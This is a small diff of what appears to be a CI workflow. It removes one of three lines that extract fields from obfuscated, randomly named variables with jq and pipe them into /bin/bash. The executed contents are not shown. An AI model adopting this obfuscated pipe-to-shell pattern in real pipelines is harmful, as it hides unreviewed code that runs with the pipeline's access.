@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$rio5021" | jq -r .okfpz46381 | /bin/bash
           printf '%s' "$b07829" | jq -r .lcd7 | /bin/bash
-          printf '%s' "$fj44" | jq -r .qjtx15876 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
